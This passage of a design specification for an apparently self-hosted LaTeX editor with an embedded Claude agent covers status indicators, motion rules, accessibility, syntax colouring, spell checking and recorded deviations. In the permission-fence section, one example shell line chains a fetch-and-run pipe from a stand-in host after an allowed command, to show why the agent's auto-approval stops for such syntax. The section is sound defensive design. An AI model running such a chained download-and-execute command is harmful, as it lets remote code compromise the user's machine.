an `--ok` dot for allowed and an `--ink-3` dot for denied, and stays there forever.

### Compile status strip

26 px, full width of the editor pane, docked at its bottom above the diagnostics drawer.
`--surface-2`, 1 px `--line` top border, `micro` tabular `--ink-2`, 10 px horizontal padding.
Segments are separated by 12 px of space and a 1 px × 10 px `--line` vertical rule, **never
a middle dot**.

Left, a 6 px dot plus one word:

| State | Dot | Label |
|---|---|---|
| idle | 1 px `--ink-3` ring, hollow | `Ready` |
| compiling | solid `--pen` | `Compiling` |
| ok | solid `--ink-3` | `Built 1.06s` |
| warnings | solid `--warn` | `2 warnings` (click opens drawer) |
| errors | solid `--error` | `3 errors` (click opens drawer) |

**A clean build renders in no colour at all.** Green for success is the reflex, and it means
the strip lights up on every keystroke-triggered rebuild, dozens of times an hour,
training the user to ignore it. `--ok` is spent on git and permissions, where it fires
rarely and means something. Success here is the *absence* of colour, which makes `--warn`
and `--error` the only things that ever catch the eye.

A 2 px indeterminate `--pen` hairline is pinned to the strip's top edge during compiles,
**but only if the compile passes 400 ms.** A 1 s task with an instant spinner reads as slow;
a 1 s task where the indicator never appears reads as instant. On completion the hairline is
removed with no exit animation.

Centre: `chapters/02_theory.tex` (mono 11 px) · rule · `Ln 118, Col 24`. Right: `8,412
words`, click toggling chapter ⇄ document scope, and a rebuild affordance that appears only
on strip hover.

**The strip never reflows.** Every numeric field is tabular with a reserved min-width, so
digits changing during a compile shift nothing. A status bar that jitters makes the whole
app feel loose.

### Git panel (rail, last)

A panel like the others in the rail: a 26 px header, `Git` in `micro`, the count of
changed files in `--ink-3` beside the chevron when there are any, and the body folds under
it. The open state is remembered per project with Files, Sections and Search; a project
with nothing stored opens with it showing, so the offer to keep versions is the first
thing a new project shows. Open, the footer is at most three rows: branch in Source Code
Pro 12 px with `↑2 ↓0` in `micro`; `4 files changed` in `--ink-2`, click expanding an
inline list of dirty paths; a 26 px `Commit and push` button. Clean state shows `main`
with an `--ok` dot and no button.

First run replaces the footer with one 5 px-radius card, and there are two: a project
with no repository is offered `Keep versions here`, a project with a repository and no
remote is offered `Back up to GitHub`. The primary is full width, as `Commit and push`
is, and the quiet controls (`Back up to GitHub` under the first, `Not now` under both)
sit on a second row in `micro`, because the rail is 240 px and drags to 180, and three
labels in one row folded inside their own 26 px boxes. `Not now` sets the card aside for
that project, but never the panel: a repository with no remote keeps `Back up` on the
branch row, and a project with no repository keeps `Keep versions` and `Back up` on one
quiet line.

## 6. Motion

Durations: **0 / 90 / 120 / 180 ms**. Nothing exceeds 180 ms. Easing is
`cubic-bezier(0.22, 0.61, 0.36, 1)` everywhere; there is no second curve.

**Does not animate, 0 ms, deliberately:** pane resize while dragging (the pane must be
welded to the cursor); tab switching and editor content swaps; file tree expand/collapse (a
150 ms accordion on a chapter folder is the single most sluggish-feeling thing an editor can
do); diagnostic row expansion; edit-chip diff expansion; PDF re-render and page paint; every
status strip text and dot change; row hover fills (hover feedback that fades is hover
feedback that lags); streaming text.

**Animates:**

| What | Duration | Why |
|---|---|---|
| Permission card entry: opacity 0→1, `translateY(2px)` | 90 ms | It interrupts; it should be seen arriving, not blink into place |
| Slide-over Claude panel, `translateX` | 180 ms | Shows where it came from and where it goes back to |
| Edit-chip collapse on undo (height) | 120 ms | Shows the reversal actually happened |
| SyncTeX highlight rectangle, fade out | 700 ms | Long enough for the eye to find it after a jump |
| Compile hairline (indeterminate sweep) | 900 ms loop, appears only after 400 ms | |
| Streaming caret blink | 1.06 s, only while paused | |

No toasts. No skeletons. No shimmer. No spinners anywhere. No hover lift, scale, or shadow
on any card. No page-turn animation in the PDF.

`prefers-reduced-motion: reduce` collapses every transform and height transition to 0 ms and
keeps opacity changes at 90 ms.

**Anti-jump rule for the PDF**, which is a motion decision even though nothing animates:
scroll position is anchored to *page index + normalised offset within that page*, not to a
pixel `scrollTop`, so a rebuild that changes the page count does not slide the view. The new
document renders into an offscreen canvas layer and swaps in a single frame: the pane is
never blanked, never shows a loading state, and never returns to page 1.

## 7. Three things deliberately not done

**1. No loading indicators for compiles.** The default is a spinner or skeleton the instant
a build starts, plus a green checkmark when it lands. Neither is here. Compiles take ~1 s,
and a spinner shown at 0 ms on a 1 s task is what *tells* the user the task is slow, it
converts an imperceptible wait into a watched one. Instead the dot changes colour in the
same frame, the PDF keeps showing the last good render, and a 2 px hairline appears only if
the build crosses 400 ms. Success is monochrome, because a green checkmark firing on every
debounced rebuild becomes noise within an hour.

**2. No full-width bottom console with `Problems | Output | Terminal` tabs.** That is the
VS Code shape and it arrives by reflex in every editor-like brief. It is wrong here: it
takes height from the PDF, which is the entire point of the right half of the screen, and it
separates an error message from the source line it refers to by the full width of the app.
The diagnostics drawer is scoped to the editor pane, so error → line number → source → `Fix`
is one vertical eye path in one column.

**3. No chat bubbles, avatars, or a warm-cream-plus-terracotta document aesthetic.** The
agent panel is the highest-risk surface for looking generic: rounded bubbles, a circular
avatar, alternating alignment, a gradient send button. Instead the agent is set in a serif
at 68 characters behind a 3 px violet rule, with the *user's* message given the lesser
visual weight. Likewise the app is not cream-and-terracotta and not graphite-and-neon: it is
a proofing grey that exists to make the white page look white, with the accent borrowed from
hectograph violet, the ink theses were actually duplicated in.

Also cut, quietly: all-caps tracked eyebrow labels, `A · B · C` middle-dot meta strings, `→`
glyphs on buttons, monospace as decoration for small labels, and a single global
border-radius (0 for panes, 3 for rows, 5 for cards, the radius encodes what kind of object
you are looking at).

## 8. Deviations recorded during implementation

Each of these departs from the specification above. They are written down
rather than left implicit, so the next person to read both can tell a
decision from a drift.

**Two animations repeat without being asked, not one.** §10 claims the breathing
compile dot is the only one. The agent's activity dot is the second, and for the same
reason: a turn can spend twenty seconds inside a tool with nothing arriving in the panel,
and a still indicator beside a still transcript is indistinguishable from a turn that has
stopped. It pulses at 1400 ms, slower than the compile dot, because it sits beside the
agent's name for the whole of a turn rather than for a second, and it stops entirely under
`prefers-reduced-motion`.

**The 350 ms input shield is visible.** §5 says the buttons ignore clicks "at full opacity,
with no visible change". As built they fade in over the shield. The argument for the
original is that a dimmed button invites a wait; the argument for what shipped is that a
button which looks live and does nothing is the more confusing of the two failures, and the
shield exists precisely because a card can arrive under a cursor already moving. Recorded
as it is, deliberately.

**The `Allow` label is white on light and ink on dark.** §5 specifies `#FFFFFF`. White on
the dark theme's `--pen` measures 2.57:1 and fails; dark ink on it measures 6.20:1. The
build is right and the specification was wrong. The same applies to any filled `--pen`
button in the dark theme.

**Filled `--pen` is conditional on Send.** §10 says filled violet is "`Allow` and `Send`
only". Send carries the fill only when the composer has something in it; empty, it is a
ghost. That is the rule as it should read: the fill marks the action that is available,
not the button that is present.

**The agent's `⋯` opens a drawer, not a popover.** The file row's menu overlays the tree;
this one pushes the transcript down. They differ because the transcript is pinned to its
bottom and a popover over it would cover the newest turn, the thing most likely to be
being read. It matches the Usage panel directly above it, which is the surface it sits
next to, and both are dismissed the same way.

**The source/preview toggle below 900 px lives in the tab bar**, not the status strip as §4
says. It is a view switch, and the tab bar is where this app puts view switches. Its
selected state is `--hint`, per §10.

**There is a filter box after all.** §5 said there would not be one: "tree type-ahead does
that job for nothing, and a thesis has tens of files, not thousands." That reasoning holds
for a thesis the writer is holding in their head, and stops holding for one reorganised
over a year. Type-ahead can only jump to a name you can already spell from its first
letter, in a tree you can already see; it cannot answer *where did the o-nitrophenol figure
end up*. The box was asked for by the writer using the app daily. It costs one 26 px row,
shown only when the magnifier is pressed, and type-ahead is kept exactly as it was for the
keyboard path.

**The permission fence has a switch.** §5's permission card is written as though a card is
unconditional, and for the actions that matter it still is. But a card for every action is
how a card stops being read, the same argument this document already makes for waving
read-only tools through, and a writer who has approved the same build command forty times
is being trained to click *Allow* without looking. Auto mode is therefore offered, and the fence stays up in four
places: a write outside the project root, because that is the one action that leaves the
thing the writer pointed the agent at; a file inside the project that the build executes,
because approving the writing is not approving the machinery that runs it; a shell command
carrying syntax no first-word rule can describe, because `git status; curl evil | sh` starts
with `git`; and anything that leaves the machine, because the address and the payload are
both chosen from files that may have arrived from somebody else. Two further things hold it
honest: every automatic approval is still emitted as a card that arrives already answered, so
nothing vanishes from the record; and while the mode is on a persistent `--warn` **Auto**
chip sits beside the agent's name, because a fence that is down and silent is worse than no
fence.

**A card that stops has to say which rule stopped it.** This was the half that was missing,
and it was reported by the writer rather than found by reading: with the switch on, auto mode
would simply stop, and nothing on the card said why. Worse, the card was often describing a
different rule. A write to a `latexmkrc` was announced as a write outside the project, which
is false twice over, since the file is inside the project and the rule that held it back was
the one about files the build runs. And a command carrying shell syntax was explained with
"it runs more than one command", which is true of four of the seven characters and false of
the other three: `latexmk > build.log` runs one command. Each card now works out for itself
which rule put it up, from the same facts the fence used, and says so in the writer's terms.
The reason line is empty when the switch is off, because then the answer is that this app
asks before it acts, and printing that on every card is how people learn to stop reading
them. The same
change made the rules from *Allow always* visible too: those were previously allowed in
silence, which was the same hole, unnoticed.

**Fonts are self-hosted, not loaded from Google Fonts.** §3 says "Google Fonts
only". NextTex is a self-hosted tool that people run on a private tailnet, and
often on a machine with no route to the public internet; a stylesheet from
`fonts.googleapis.com` would make the app's typography depend on Google being
reachable, and would tell Google every time someone opened their thesis. The
three families ship as `@fontsource` packages in the bundle. The typefaces and
their roles are unchanged.

**Proposed: what this specification would have to say to support touch, and
what it costs.** Written and not built, deliberately. The interface review
found that touch is not partially supported here, it is absent, and the
difference matters: a partial answer can be improved in place, and an absent
one is a decision about who the app is for. That decision belongs in this
document before any of it is coded.

What is actually there today, measured rather than estimated. **Zero** touch
handlers in the entire source. Three files handle `pointerdown`, all of them
for dragging a pane divider, and a pointer event from a finger arrives without
the hover that the affordance around it assumes. The smallest interactive
targets are 22 by 26 pixels, against the 44 by 44 that both platform
guidelines ask for. The preview's zoom is a `wheel` event with `ctrlKey` set,
which is a trackpad pinch and a mouse wheel and nothing a finger can produce.
The breakpoints above go down to 900 px and stop; below that the layout does
not reflow, it overflows, and there is no scroll fallback, so the right-hand
edge is simply unreachable.

The proposal, in the order the work would have to happen.

First, a stated minimum. This app is a two-pane editor with a third pane for
an agent, and there is a width below which that is not a layout, it is a
concession. Say 720 px, and below it give the shell a horizontal scroll rather
than a clip, so a narrow window is awkward and not broken. That is a small
change and it is the one that stops the current silent failure.

Second, hit targets, which is not a global size change. The rule would be that
anything a finger is expected to hit carries a 44 px touch area, through
padding or a pseudo-element, without the visual control growing. Applying it
everywhere would coarsen an interface whose density is the point; applying it
to the row menus, the tab close buttons and the preview controls is most of
the benefit.

Third, the gestures that have no keyboard or mouse equivalent. Pinch-to-zoom
in the preview is the only one, and it is `touchstart`/`touchmove` with two
points feeding the same zoom path the trackpad already uses.

Fourth, the pane dividers. A 3 px divider is a mouse target. On touch it needs
either a wider invisible grab area or, better, the folding controls that
already exist as the primary way to change the layout.

What is deliberately not proposed: a separate mobile layout, a phone-sized
breakpoint, or a rewrite of the shell. A tablet in landscape is the honest
target, because that is where a person edits a thesis and reads its proof.
A phone is not, and saying so is more useful than half-supporting one.

**Built, and four of the measurements above were wrong.** They are corrected
here rather than left, because the paragraph presents them as measured rather
than estimated, and a document that is wrong about its own numbers teaches the
next reader not to trust the rest.

There are no width media queries in the source CSS at all. The breakpoints are
JavaScript, in `layout.ts` now, and they are in shell units rather than
viewport pixels: the interface size is a `zoom`, so at 150 per cent a 1600
pixel window is a 1067 pixel shell and reaches them the way a much smaller
window would. Below 1400 the chat undocks, below 1100 the rail folds, below 900
the source and the preview take turns.

The smallest targets are not 22 by 26, which is the icon button size. The three
controls named above are smaller: the tab close button is 16 by 16, the file
tree row menu carries no size class at all inside a 16 pixel span, and the
preview zoom controls are about 13 by 16. Two of them are also `opacity-0`
until `group-hover`, which is a different and worse problem than being small:
on a device with no hover they are not hard to hit, they are invisible, and no
gesture reveals them. Those are gated on a `hoverable` variant now, so a mouse
sees them appear as before and a finger simply sees them.

The 44 pixel rule could not be applied flat. A file tree row is on a 22 pixel
pitch, so a 44 pixel tall invisible target centred on its menu would reach into
the rows above and below and take their taps, which is a worse bug than a small
control. The rule is therefore 44 on the axis with room and the row's own pitch
on the axis without it, through a pseudo-element, so no visible control changes
size and the density changes nowhere.

The clipping was at two layers, `body` and the shell, and the shell's is
deliberate: it clips with `overflow: clip` precisely so that nothing, including
a browser scrolling a focused element into view, can drag the window's frame
sideways. So the scroll fallback went outside it rather than into it. A shell
that cannot fit is wider than the frame around it and the frame scrolls, while
focus inside the shell still cannot scroll the shell. The minimum is a stated
number rather than `min-content`, which was tried and is wrong here: the
preview zooms to 300 per cent, and a zoomed page makes that pane's min-content
enormous, so the shell ballooned and the whole interface became horizontally
scrollable at high zoom. A pane that scrolls its own content must not be
allowed to set the width of the window it sits in.

The pinch feeds the zoom path the trackpad already uses, converted through one
tested function, so the limits, the frame coalescing, the redraw rationing and
the commit are all unchanged. One real difference is worth stating: a touch
gesture has an end event, and the settle delay exists only because a wheel does
not, so a pinch commits when the fingers lift rather than waiting out a timer
that is guessing.

The dividers were also mis-described. The vertical ones are a one pixel line
with a nine pixel invisible grab span, which is a comfortable mouse target and
a poor finger one, so it widens to twenty-four on a coarse pointer. Only the
diagnostics resizer was a bare three pixels, and it was a second copy of the
drag code that had never adopted the shared frame throttle. It uses the same
handle as the pane dividers now, with an axis.

The browser tier has a second project for this: a tablet-sized viewport with a
real touch pointer, running one spec. Not a spread of a device preset, because
those carry a WebKit browser type and this tier launches a pinned Chromium. All
three of its assertions were watched to fail against the interface as it was.

**Accepting an invite is a two-step answer, and the first step writes
nothing.** Joining used to sync the whole project, write every file, and
register it, and the first moment a person could look at what they had
accepted was after all of it was on their disk. Accepting an invite is
downloading somebody else's files, and vetting them is not an unreasonable
thing to want to do first.

So the join stops with the documents in memory and the connection held open,
and answers with the manifest: every path, its kind and its size. Accept
writes them and registers the project. Discard closes the connection and
removes the folder, which really does leave nothing behind rather than
deleting something written a moment earlier.

A file the build would run is listed as offered and marked as one that will
not be written, rather than being quietly left out. What somebody tried to
send is the more interesting of the two facts.

The connection cannot be held indefinitely: an unanswered join is discarded
after ten minutes by the same reaper that evicts idle sessions, and every
pending one is released when the server stops. A tab closed on the question
must not hold a peer connection open for the life of the process.

**A dialog keeps Tab, and gives focus back when it closes.** There was no Tab
handler anywhere in the source, so seven of the nine dialogs let Tab walk out
into the page behind them while they were still covering it, and dismissing one
left focus on `document.body`: the next Tab started from the top of the app
rather than from the control that had opened the dialog.

Both live in `useDismiss`, which every dialog already uses to close, so no
dialog had to ask for them. The trap is keyed on `role="dialog"` and nothing
else. A menu or a popover is not modal, and taking Tab away from the page
behind one would be a worse answer than the page behind it receiving Tab.

A dialog that opens with nothing focusable inside it still takes the caret,
through a `tabindex` of -1 on the panel, because otherwise the next key press
goes to the editor underneath.

Focus is given back on the way out, but only when nobody else has claimed it.
Restoring unconditionally is wrong and the browser tier said so: the file
tree's Rename item closes its menu and an inline input takes the caret in the
same gesture, so putting the caret back took it straight off again and the new
name was typed into nothing.

The one dialog this does not reach is the tutorial overlay, which does not use
the hook.

**There is a stack of transient messages, at the bottom of the shell.** §6 says
"no toasts". It carries save and download failures only, the cases where an
action the user took did not happen and nothing else on screen would say so. It
has no timer: a message stays until dismissed, because a failed save that fades
out is worse than no message at all.

A stack rather than one message, because for a long time it was one string and
thirty places wrote to it, so a second failure erased the first without a word:
two files refused in one drop, one message on screen. Each message has an
identity and its own dismiss control, and two identical messages in a row are
one event to somebody reading them.

The container is a `role="status"` live region and it is always in the
document, empty or not. A live region that appears at the same moment as its
content is not announced by every screen reader, and announcing these is the
whole purpose: they are the only report that something a person asked for did
not happen. `polite` rather than `assertive`, because none of them interrupts
what the writer is doing.

**Editor syntax highlighting is near-monochrome, and colour is opt-in.** The
specification does not cover token colours. By default, and this default is
unchanged: commands take `--ink` a step above the prose, comments `--ink-3`
italic, arguments and literals `--ink-2`, and no hue is introduced: the
rendered page sits two panes away and must stay the loudest object on screen.
"A step above" was a flat 600 until the prose weight became a setting; it is
`--nx-weight-strong` now, and in this mode weight is the only thing saying
which of two words is a command. The weight is itself a setting since §32
(Settings → Emphasis → Plain), and when it is off a command takes
`--syn-command`, a quiet slate, so that the sentence above stays true.

A per-machine setting (Settings → Highlighting → Colour) gives five families of
control sequence a hue each: sectioning, environments, mathematics, citations
and references, and the preamble. It exists because a chapter of LaTeX is far
easier to skim for its equations and its headings than for its words, and in one
ink it cannot be skimmed for either. Three things keep it from costing what §8
was protecting:

- It is off unless asked for, and off means off: every rule is gated behind
  a single class, so with the setting unset the decoration classes match no
  CSS whatsoever and the editor renders byte-identically to one built before
  the feature existed. The first version instead set each family to an ink,
  which requires knowing exactly what the LaTeX mode does to every token,
  and it does not do one thing. `\begin`, `\cite` and `\label` are `stex`
  plugins whose braced argument is an `atom` at `--ink-2`; `\section` is not
  a plugin, so its heading is plain text at `--ink`. One rule for "the
  argument" dimmed every heading in the untouched mode.
- The five hues sit at one lightness and one chroma ceiling per palette, so
  they read as one family rather than as a rainbow, and each is defined in
  both `.nx-theme-light` and `.nx-theme-dark`: the editor's own theme carries
  them, so a white page in a dark shell gets the light palette's colours.
  `contrast.test.ts` certifies every one against `--surface` in both.
- **A keyword must never melt into the prose**, which is the writer's own
  rule and the one the light palette broke for a year: "they should color
  match to the theme but when the focus is on the text, the keywords should
  be differentiated enough from normal text and vice versa." It is a rule
  about the *text*, not the paper, and that distinction is the whole story
  here. On a light page the prose is a near-black ink, so raising contrast
  against the page means going darker, which moves a colour **toward** the
  words it has to stand out from. The families sat at OKLab lightness 0.45,
  then briefly at 0.40, and both were rejected as melting in, at 0.40 a
  coloured command stood 22.6 L\* clear of the prose where even `--ink-3`
  stands 27.3 clear, while measuring a comfortable 7.0:1 against the paper.
  Contrast was never the axis.
- **Colourfulness is chroma weighted by lightness, and that is what the
  tests measure now.** `#18448C` carries a chroma of 0.129, more than the
  dark theme's blue, and still reads as navy-dark rather than as blue,
  because a saturated near-black is not a colour whose hue anyone can see.
  So the palette went to lightness 0.52 with the chroma ceiling removed
  entirely, each hue taking the most sRGB will give it there: 0.213 for the
  blue and 0.208 for the red against 0.115 before, standing 34–39 L\* clear
  of the prose where the dark theme manages 14–18. `contrast.test.ts` scores
  chroma × L\* and holds the floor just under what this palette measures;
  the two rejected ones score 0.021 and 0.028 against its 0.040 and dark's
  0.079. In every light palette the weakest is the teal, which sRGB starves
  at any lightness a light page can use.
- **These five are held to 4:1 rather than 4.5:1, deliberately, and it is
  the only such exemption in the file.** They measure 4.1–4.9:1 on the
  proofing grey and 4.8–6.1:1 on the three papers. Three things make the
  trade defensible here and nowhere else: colouring is off by default, so
  nobody is given it without asking; it is never the only carrier, because a
  control sequence is set 200 weights above the prose whatever this setting
  says, so removing the colour entirely leaves the file legible, which is
  the condition WCAG actually asks for; and it applies to control sequences,
  a fixed vocabulary five to fifteen characters long, not to running prose,
  which is still 14.4:1 and untouched. The floor is 4:1 rather than absent
  so that the next change has to be as deliberate as this one.
- **The choice was made by looking, not by arithmetic.** Five candidates
  were rendered as real source on all four light pages and the writer picked
  one. Every number above is a justification of that choice or a guard on
  it, not the thing that produced it.
- None of them is violet. `--pen` means the agent touched this line and is the
  one accent that appears near the text itself; the test asserts 35° of hue
  clearance from it, so a heading can never be mistaken for an edit. The other
  four accents appear inside the editor only as gutter bars, dotted underlines
  and washes, never as the colour of text, so the syntax hues share a
  channel with none of them.

The families are decided by command name in `latex-families.ts` and applied as
a `ViewPlugin` decoration, not as a `HighlightStyle`: the `stex` mode reports
every control sequence as one token, so a style keyed on token types cannot
tell `\section` from `\cite` however many colours it is given. Inline `$...$`
is decorated too, since it is the one form of mathematics that carries no
command to key on. Names outside the five lists take the ordinary command
styling rather than a guessed family.

**Spell checking, off by default.** The specification does not mention it.
CodeMirror sets `spellcheck="false"` on its content and is right to: a LaTeX
file is mostly not English, and the browser's own checker underlines every
package name, citation key, label and environment. A checker that marks
those teaches the writer to ignore every mark it makes, which is worse than
having none.

So the work is in deciding what is prose. `spell-scan.ts` subtracts rather
than adds, and the set it subtracts is: comments; control sequences
themselves; inline and displayed mathematics; optional arguments, which are
always keys, lengths or placements; the braced argument of every command
whose argument is a name rather than a sentence; `\verb` and whatever
delimiter it chose; and everything inside an environment that is not prose
at all, the maths environments, `verbatim`, `lstlisting`, `minted`,
`tikzpicture`, which is tracked across lines, because an `\end{align}` may
be a long way below its `\begin` and a per-line scan cannot see that. What
is left is checked. Words shorter than three letters and words in full
capitals are passed over as well: an acronym is spelled by its initials and
no list holds it. The distinction that matters is
not which family a command belongs to: `\section{...}` and `\caption{...}`
take prose and are checked, because a typo in a heading is the one a writer
most wants caught, while `\begin{...}` and `\label{...}` never do.

Three constraints shaped the rest:

- **Nothing ships until it is asked for.** The checker sits in a
  `Compartment` that is empty until the setting is turned on, so neither it
  nor its word list is in the interface bundle. The list is 98 kB brotli'd,
  and since §36 carries the British delta beside it for another seven,
  and is fetched once, on first use. `bundle.initial_kb` still rose about
  four kilobytes for the switch and the editor's side of it, and the budget
  was raised deliberately rather than quietly, see `bench/thresholds.json`,
  which now says why.
- **The writer's own words are the feature.** A dissertation is full of
  terms no list holds, so a right-click on an underlined word accepts it
  permanently, into `.nexttex/dictionary.txt`: machine-local and
  uncommitted, like every other piece of per-project state here, and plain
  text so two hundred species names are a paste rather than two hundred
  clicks.
- **It is not a diagnostic.** A dotted underline in `--ink-3`, no gutter bar
  and nothing in the diagnostics drawer. Red and amber mean the build is
  wrong; three hundred spellings in that drawer would bury the two compile
  errors that matter.

There are no suggested corrections. Ranking candidate spellings is a real
algorithm and a real interface, and neither is what was asked for.

**The status strip adapts to its own width by dropping segments.** §5 requires
that the strip never reflow. The editor pane is resizable down to 420 px, where
all six segments cannot fit on one line. Rather than wrap, segments drop out in
reverse order of value, the file path first, since the tab above already names
it, then the preview scope, through container queries on the strip itself.
Every remaining segment keeps its reserved width, so nothing shifts as digits
change.

**A `Hide` control on the slide-over.** §4 describes the Claude panel becoming a
slide-over below 1400 px but not how it is dismissed; without one it covers the
PDF permanently. Below that width the tab bar carries a `Claude` button and the
panel a `Hide` link, and the panel animates on `translateX` at 180 ms as
specified.


## 9. Revision two

The first implementation was reviewed against sections 1–8 and the findings
acted on. What follows is what the design gained afterwards, at the writer's
direction: *"add a splash of colour and subtle animations where necessary to
give hints to the user… tune the colour palette towards the darker side… give
the user two options, one light and one dark… all panels should be resizable
and collapsible… the user should be able to see their usage stats and change
the model on the agent panel… all projects start blank."*

**A second accent, `--hint`, with one job.** `--pen` still means *Claude
touched this* and nothing else. `--hint` is for live and interactive state that
is not the agent: the `Stop` control while a turn is running, a control the eye
is meant to find. It is a desaturated teal at roughly 185°, a hundred degrees
from the pen, so the two never read as the same signal.

**Motion is a hint, never decoration.** Four primitives, all inside the 0/90/
120/180 ms budget: `.nx-hover` (90 ms colour on interactive rows), `.nx-press`
(a 1 px depress on click, so a button feels answered), `.nx-pane` (180 ms width
change when a panel folds, so it is clear where it went), and `.nx-arrive`
(120 ms, 3 px rise, for something that appeared because you asked for it:
the usage panel, the welcome message). `prefers-reduced-motion` reduces all of
them to an opacity change.

**Every panel folds, and says where it went.** The file list, the source, the
preview and the Claude column each have a fold control; a folded panel leaves a
26 px strip carrying its name vertically, which is both the evidence that it is
folded and the control that brings it back. Source and preview are mutually
exclusive: folding one gives the other the whole middle, and folding both
would leave nothing to work in. Fold state is remembered per project.

**The preview reads two ways.** A `Scroll` / `Page` toggle in the PDF bar. The
scrolling view is the default and is built for rebuilds: page elements and
their canvases are *reused* when a rebuild produces the same page count and
geometry, so a recompile redraws only the pages actually on screen instead of
recreating the document. Scroll handling is coalesced to one pass per animation
frame, and a canvas keeps its previous render until the new one is ready, so
the pane never blanks. Page mode keeps a single page in the flow and answers
the arrow keys.

**The agent column carries its own instruments.** A model selector (default,
Opus, Sonnet, Haiku) that takes effect on the next question, the conversation
resumes by session id, so changing model does not lose the transcript, and a
usage readout: turns, estimated cost, tokens sent, written and read from cache,
and model time, counted per project and kept across restarts. Cost is labelled
as an estimate, because on a subscription it is not a bill.

**New projects are blank.** One empty document, an empty bibliography, a
figures folder. A journal class, a university handbook and a lab report agree
on nothing, so NextTex does not guess: the way to shape a project is to upload
the real template and let the agent read it.

**The agent speaks first.** A project with no conversation shows a message from
Claude, written into the app, not generated, covering the three panes, what
the agent can and cannot do without asking, how to tailor the project with a
template, and how to teach it the writer's voice. It is the app's only
onboarding, and it is set as the agent's own prose because the agent is what
does all of it.


## 10. What the second audit changed

The built interface was audited as a whole, visual design, information
design, interaction, wording, accessibility, against §§1–9 and against real
renders in both themes. The audit's own summary is that four things carried
most of the damage; all four are fixed, along with most of the smaller
findings.

**The transcript is now durable, and that is architecture, not polish.** The
model resumes its own memory of a conversation from disk, so a panel that
started empty meant the agent could refer to work the writer could not see.
More importantly, §5 promises that the chat is a record of what was done to
the document, every diff, every reverted edit, every command allowed or
refused, and a record that survives one session is not a record. Events are
now written to `.nexttex/transcript.jsonl` as they are broadcast, with
streamed text coalesced into whole messages, and replayed when the project is
reopened. A permission still unanswered when the window closed replays as
denied, because the turn that was waiting on it is gone.

**Folding the file list no longer strands anything.** The project name, the
switcher, the theme toggle and the downloads move into whichever header is
still on screen: the tab bar, or the preview header when the source is
folded too.

**The surfaces have their specified separation.** The steps had been built at
roughly half the distance the palette called for, and `--line` sat at 1.5:1,
so panes had no visible edges, drag handles were invisible, and a selected
segment was indistinguishable from an unselected one. The steps are now 5–7
L\* apart in both themes and `--line` clears 3:1. `--ink-3` was below 4.5:1 on
`--surface-2`, the surface most of the app's metadata actually sits on, and
is now 5.2:1 in both.

**Green means the preview is current.** §5 says a clean build renders in no
colour at all, and §7 argues that a green tick firing on every debounced
rebuild becomes noise within an hour. That argument is about a *success
flash*; the dot is a *resting state*, and the two are different objects.
Green here does not fire: it sits, for hours, and says the picture beside
the text is the text. What fires is the departure from it: the dot goes
`--warn` on the first keystroke after a build and stays there until the next
one lands. Colour now answers one question, does the preview match the
source, and the label beside it answers the other, which is what the last
build had to say. `--ok` therefore carries a fourth job beyond git, diffs and
resolved permissions.

**Warnings no longer colour the dot.** §5 gave `--warn` to chktex counts. It
now means the preview is behind, in both the stale and the compiling states.
A document with warnings and a current preview shows a green dot and the
label `2 warnings`, which is accurate on both counts: nothing is out of date,
and there are two things to read if you want them. Warnings keep their
`--warn` severity bar in the diagnostics drawer, and their gutter bar in the
editor when the writer has that switched on.

**The compiling dot breathes, and it is the only animation in the app that
repeats without being asked.** §6 lists every status strip dot change under
*does not animate*, and §7 says there are no spinners anywhere. Both stand,
with one exception written down here: a build that has already run for 400 ms
is the one case where the strip has to say *still working* rather than *this
is the state*, and the 2 px hairline that used to say it swept the full width
of the strip, in the corner of the eye, for as long as the build took. The
dot breathes instead, opacity 1 → 0.32 over 700 ms, alternating, on the
app's single curve: on the same 400 ms threshold the hairline used, so a
130 ms build still shows nothing at all. Under `prefers-reduced-motion` it
becomes a hollow `--warn` ring, the same disc-versus-ring distinction the
idle dot already uses, for the same reason the hairline became a static bar.
The sweeping hairline itself survives, on the one operation that genuinely
takes minutes: installing an update.

**The underline points at a token, or there is no underline.** §4 already
says the gutter carries the news and the writer comes to the detail. A dotted
rule under a whole line of LaTeX was not pointing at anything the gutter bar
had not already said, and it was drawn through text somebody was trying to
read. It now covers the token at the column the tool reported, and where
there is no usable column, every compile error, since the LaTeX log has none
, the gutter bar is the whole in-text signal.

**Two drifts, recorded rather than fixed.** `--line` composites to about
2.4:1 in light and 2.6:1 in dark against the surfaces it sits on; the note
below claiming it "clears 3:1" has not been true since the mix was set at
55%. Raising it to about 68% would make the claim true and visibly thicken
every border in the app, which is a separate decision from this one. And this
table's `--pen` values had drifted from the stylesheet's twice before this
revision, which is why the contrast test now parses the palette out of
`styles.css` rather than trusting anything written here.

**`--pen` is back to meaning one thing.** It had spread to eight filled
buttons, of which five had nothing to do with the agent; the loudest object in
the light theme was a GitHub setup button. Filled violet is now `Allow` and
`Send` only: answering the agent, or addressing it. Everything else is a
ghost button that takes `--hint` on hover, which is also now on the drag
handles, the segmented controls, the chip actions and the fold controls: the
jobs the second accent was invented for.

Also: the welcome message is three paragraphs with its three instructions as
buttons that do the thing, rather than five paragraphs of prose pointing at a
grey row; the usage panel leads with one number instead of a 2×3 grid in four
units; the edit chip shows `Show` and `Undo` without waiting for a hover, and
no longer sits under a tool row saying the same thing; the permission card has
a `--warn` focus ring, because a card that answers bare keypresses must show
that it has focus, and both that ring and the ordinary `--pen` one are 2 px
rather than 1, WCAG 2.2's focus appearance asks for it, and it is the one
place this interface's taste for hairlines was working against the person
using it, since a 1 px ring at 1 px offset is a hairline in a design full of
hairlines; the file tree is one tab stop with arrow-key navigation
rather than forty; diagnostics say "2 errors, 1 warning" instead of "3
findings", which also stops severity being carried by colour alone; the
preview can fit a whole page; and reduced motion now makes the compile
indicator and the SyncTeX highlight *static* rather than fast, which was the
point of both.


## 11. Where the writing instructions live

Two things shape the prose the agent produces, and they are deliberately kept
apart.

The **system prompt** carries a long section on writing that does not read as
machine-written: lead with the claim, prefer the specific number to the
careful phrase, vary sentence length and opening, put a real subject early,
and stop rather than restating the paragraph's first sentence in different
words. It also names the tells outright, *delve*, *underscore*, *robust*,
*It is important to note*, *plays a crucial role in*, stacked
*Moreover/Furthermore*, paired near-synonyms, because a general instruction
to write naturally does not survive contact with a first draft. It is
explicit that swapping a banned word for a synonym fixes nothing.

The **voice description**, when the writer has uploaded samples of their own
work, outranks all of that. It is distilled once into eight headed sections,
sentence length ranges, paragraph shape, person, the exact hedging words,
connectives, characteristic vocabulary, how terms and citations are
introduced, and what the author never does, and the prompt says plainly that
where the two disagree the author wins, including where the author does
something the general guidance discourages. A document is supposed to sound
like its author, not like a house style. The precedence note is added to the
